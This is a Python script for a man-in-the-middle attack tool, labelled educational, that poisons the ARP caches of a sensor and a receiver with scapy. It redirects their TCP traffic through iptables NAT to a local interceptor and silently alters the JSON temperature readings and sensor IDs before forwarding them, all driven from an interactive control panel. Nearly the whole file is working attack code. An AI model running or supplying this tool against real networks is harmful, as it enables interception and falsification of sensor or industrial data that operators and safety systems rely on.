#!/usr/bin/env python3
"""
MiTM Attacker with iptables NAT for proper traffic interception
This properly handles traffic redirection at the network layer
"""

import socket
import json
import threading
import time
import subprocess
from scapy.all import ARP, Ether, sendp
import sys

# Network configuration
SENSOR_IP = "10.0.0.1"
RECEIVER_IP = "10.0.0.2"
ATTACKER_IP = "10.0.0.3"
RECEIVER_PORT = 5000
INTERCEPT_PORT = 8000  # Attacker listens on this port

SENSOR_MAC = "00:00:00:00:00:01"
RECEIVER_MAC = "00:00:00:00:00:02"
ATTACKER_MAC = "00:00:00:00:00:03"

class MiTMAttacker:
    def __init__(self):
        self.running = False
        self.spoofing = False
        self.intercepted_data = []
        self.temp_offset = 10.0
    
    def setup_iptables(self):
        """Setup iptables to redirect traffic to attacker"""
        try:
            print("\n🔧 Setting up iptables rules...")
            
            # Flush existing NAT rules
            subprocess.run(['iptables', '-t', 'nat', '-F'], check=True)
            
            # Enable IP forwarding
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1\n')
            
            # Redirect incoming TCP packets destined for RECEIVER_IP:RECEIVER_PORT
            # to local port INTERCEPT_PORT
            cmd = [
                'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-p', 'tcp',
                '-d', RECEIVER_IP,
                '--dport', str(RECEIVER_PORT),
                '-j', 'REDIRECT',
                '--to-port', str(INTERCEPT_PORT)
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                print("✓ iptables rule added: Redirect {}:{} → localhost:{}".format(
                    RECEIVER_IP, RECEIVER_PORT, INTERCEPT_PORT))
                return True
            else:
                print(f"✗ Failed to add iptables rule: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"✗ Error setting up iptables: {e}")
            return False
    
    def cleanup_iptables(self):
        """Remove iptables rules"""
        try:
            print("\n🔧 Cleaning up iptables rules...")
            subprocess.run(['iptables', '-t', 'nat', '-F'], check=False)
            
            # Disable IP forwarding
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0\n')
            
            print("✓ iptables rules removed")
        except Exception as e:
            print(f"✗ Error cleaning up: {e}")
    
    def arp_spoof(self, target_ip, target_mac, spoof_ip):
        """Send ARP spoofing packet"""
        ether = Ether(dst=target_mac, src=ATTACKER_MAC)
        arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                  psrc=spoof_ip, hwsrc=ATTACKER_MAC)
        sendp(ether/arp, verbose=False)
    
    def restore_arp(self, target_ip, target_mac, source_ip, source_mac):
        """Restore ARP table"""
        ether = Ether(dst=target_mac, src=source_mac)
        arp = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                  psrc=source_ip, hwsrc=source_mac)
        sendp(ether/arp, count=5, verbose=False)
    
    def start_arp_spoofing(self):
        """Continuously poison ARP caches"""
        print("\n" + "="*60)
        print("🔴 STARTING ARP SPOOFING")
        print("="*60)
        print(f"Poisoning ARP cache of:")
        print(f"  Sensor ({SENSOR_IP}) → claiming to be Receiver ({RECEIVER_IP})")
        print(f"  Receiver ({RECEIVER_IP}) → claiming to be Sensor ({SENSOR_IP})")
        print("="*60)
        
        self.spoofing = True
        
        while self.spoofing:
            # Poison sensor's ARP cache (sensor thinks attacker is receiver)
            self.arp_spoof(SENSOR_IP, SENSOR_MAC, RECEIVER_IP)
            
            # Poison receiver's ARP cache (receiver thinks attacker is sensor)
            self.arp_spoof(RECEIVER_IP, RECEIVER_MAC, SENSOR_IP)
            
            time.sleep(2)
    
    def stop_arp_spoofing(self):
        """Stop ARP spoofing and restore tables"""
        if not self.spoofing:
            return
        
        print("\n🔵 Restoring ARP tables...")
        self.spoofing = False
        
        # Restore correct ARP entries
        self.restore_arp(SENSOR_IP, SENSOR_MAC, RECEIVER_IP, RECEIVER_MAC)
        self.restore_arp(RECEIVER_IP, RECEIVER_MAC, SENSOR_IP, SENSOR_MAC)
        
        print("✓ ARP tables restored")
    
    def handle_client(self, client_sock, client_addr):
        """Handle intercepted connection from sensor"""
        try:
            # Receive data from sensor
            data = client_sock.recv(4096).decode()
            
            if data:
                print("\n" + "🔴"*30)
                print("📡 INTERCEPTED DATA FROM SENSOR")
                print("🔴"*30)
                
                # Parse original data
                original_data = json.loads(data.strip())
                print(f"Source IP: {client_addr[0]}")
                print(f"Original Temperature: {original_data['temperature']}°C")
                print(f"Original Sensor ID: {original_data['sensor_id']}")
                
                # Modify temperature data
                modified_data = original_data.copy()
                modified_data['temperature'] = round(
                    float(original_data['temperature']) + self.temp_offset, 2
                )
                modified_data['sensor_id'] = original_data['sensor_id'] + "_MODIFIED"
                
                print(f"\n🔧 MODIFYING DATA:")
                print(f"Modified Temperature: {modified_data['temperature']}°C")
                print(f"Temperature Offset: +{self.temp_offset}°C")
                print(f"Modified Sensor ID: {modified_data['sensor_id']}")
                
                # Store intercepted data
                self.intercepted_data.append({
                    'original': original_data,
                    'modified': modified_data,
                    'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
                })
                
                # Forward modified data to real receiver
                forwarded = self.forward_to_receiver(modified_data)
                
                if forwarded:
                    print("✓ Modified data forwarded to receiver")
                else:
                    print("✗ Could not forward to receiver (may be offline)")
                
                print("🔴"*30)
                
                # Send ACK back to sensor (so sensor doesn't timeout)
                ack = "ACK: Data received and processed"
                client_sock.sendall(ack.encode())
        
        except json.JSONDecodeError as e:
            print(f"✗ Invalid JSON data: {e}")
        except Exception as e:
            print(f"✗ Error handling client: {e}")
        finally:
            client_sock.close()
    
    def forward_to_receiver(self, modified_data):
        """Forward modified data to actual receiver"""
        try:
            # Create new connection to real receiver
            receiver_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            receiver_sock.settimeout(3)
            
            # Connect to receiver's actual IP
            receiver_sock.connect((RECEIVER_IP, RECEIVER_PORT))
            
            # Send modified data
            message = json.dumps(modified_data) + "\n"
            receiver_sock.sendall(message.encode())
            
            # Receive ACK from receiver
            ack = receiver_sock.recv(1024).decode()
            
            receiver_sock.close()
            return True
            
        except socket.timeout:
            print("    → Receiver connection timeout")
            return False
        except ConnectionRefusedError:
            print("    → Receiver not running")
            return False
        except Exception as e:
            print(f"    → Error forwarding: {e}")
            return False
    
    def start_interceptor(self):
        """Start TCP server to intercept redirected traffic"""
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            # Listen on attacker's IP at intercept port
            server_sock.bind(('0.0.0.0', INTERCEPT_PORT))
            server_sock.listen(5)
            server_sock.settimeout(1.0)
            
            print("\n" + "="*60)
            print("👂 INTERCEPTOR ACTIVE")
            print("="*60)
            print(f"Listening on 0.0.0.0:{INTERCEPT_PORT}")
            print(f"Intercepting traffic destined for {RECEIVER_IP}:{RECEIVER_PORT}")
            print("Waiting for connections...")
            print("="*60)
            
            while self.running:
                try:
                    client_sock, client_addr = server_sock.accept()
                    
                    # Handle in separate thread
                    thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_sock, client_addr)
                    )
                    thread.daemon = True
                    thread.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        print(f"✗ Error accepting connection: {e}")
        
        except Exception as e:
            print(f"✗ Interceptor error: {e}")
        finally:
            server_sock.close()
    
    def start_attack(self):
        """Start complete MiTM attack"""
        self.running = True
        
        # Setup iptables rules first
        if not self.setup_iptables():
            print("✗ Failed to setup iptables. Attack aborted.")
            self.running = False
            return
        
        # Start interceptor
        interceptor_thread = threading.Thread(target=self.start_interceptor)
        interceptor_thread.daemon = True
        interceptor_thread.start()
        
        time.sleep(2)
        print("✓ Interceptor ready")
        
        # Start ARP spoofing
        spoof_thread = threading.Thread(target=self.start_arp_spoofing)
        spoof_thread.daemon = True
        spoof_thread.start()
        
        print("\n✅ MiTM ATTACK ACTIVE")
        print("="*60)
        
        # Keep running
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_attack()
    
    def stop_attack(self):
        """Stop attack and cleanup"""
        print("\n\n🔵 STOPPING ATTACK...")
        self.running = False
        
        # Stop ARP spoofing
        self.stop_arp_spoofing()
        
        # Cleanup iptables
        self.cleanup_iptables()
        
        print("\n✓ Attack stopped and cleaned up")
        
        # Show statistics
        if self.intercepted_data:
            print(f"\n📊 Attack Statistics:")
            print(f"   Total packets intercepted: {len(self.intercepted_data)}")
            print(f"   Total data modifications: {len(self.intercepted_data)}")

def main():
    """Main function"""
    print("="*60)
    print("⚠️  MiTM ATTACK TOOL - EDUCATIONAL USE ONLY")
    print("="*60)
    print("Network Configuration:")
    print(f"  Sensor IP: {SENSOR_IP}")
    print(f"  Receiver IP: {RECEIVER_IP}")
    print(f"  Attacker IP: {ATTACKER_IP}")
    print(f"  Intercept Port: {INTERCEPT_PORT}")
    print("="*60)
    print("\n⚠️  WARNING: Use only in controlled environments!")
    print("="*60)
    
    attacker = MiTMAttacker()
    
    while True:
        print("\n" + "="*60)
        print("MiTM ATTACKER CONTROL PANEL")
        print("="*60)
        print("1. Start MiTM Attack")
        print("2. Stop Attack")
        print(f"3. Set Temperature Offset (Current: +{attacker.temp_offset}°C)")
        print("4. Show Intercepted Data")
        print("5. Show iptables Rules")
        print("6. Exit")
        print("="*60)
        
        try:
            choice = input("\nSelect option: ").strip()
            
            if choice == "1":
                if not attacker.running:
                    print("\n🔴 Launching MiTM attack...")
                    attack_thread = threading.Thread(target=attacker.start_attack)
                    attack_thread.daemon = True
                    attack_thread.start()
                    time.sleep(1)  # Give it time to start
                else:
                    print("✗ Attack already running!")
            
            elif choice == "2":
                if attacker.running:
                    attacker.stop_attack()
                else:
                    print("✗ No attack running!")
            
            elif choice == "3":
                try:
                    offset = float(input("Enter temperature offset (°C): "))
                    attacker.temp_offset = offset
                    print(f"✓ Temperature offset set to: +{offset}°C")
                except ValueError:
                    print("✗ Invalid number!")
            
            elif choice == "4":
                if attacker.intercepted_data:
                    print("\n" + "="*60)
                    print("INTERCEPTED DATA LOG")
                    print("="*60)
                    for i, entry in enumerate(attacker.intercepted_data, 1):
                        print(f"\nPacket #{i}:")
                        print(f"  Timestamp: {entry['timestamp']}")
                        print(f"  Original Temp: {entry['original']['temperature']}°C")
                        print(f"  Modified Temp: {entry['modified']['temperature']}°C")
                        print(f"  Difference: +{entry['modified']['temperature'] - entry['original']['temperature']}°C")
                    print("="*60)
                else:
                    print("✗ No data intercepted yet")
            
            elif choice == "5":
                print("\nCurrent iptables NAT rules:")
                subprocess.run(['iptables', '-t', 'nat', '-L', '-n', '-v'])
            
            elif choice == "6":
                if attacker.running:
                    print("Stopping attack before exit...")
                    attacker.stop_attack()
                print("Goodbye!")
                break
            
            else:
                print("✗ Invalid option!")
        
        except KeyboardInterrupt:
            print("\n\nExiting...")
            if attacker.running:
                attacker.stop_attack()
            break
        except Exception as e:
            print(f"✗ Error: {e}")

if __name__ == "__main__":
    import os
    if os.geteuid() != 0:
        print("✗ This script must be run as root (use sudo)")
        sys.exit(1)
    
    main()
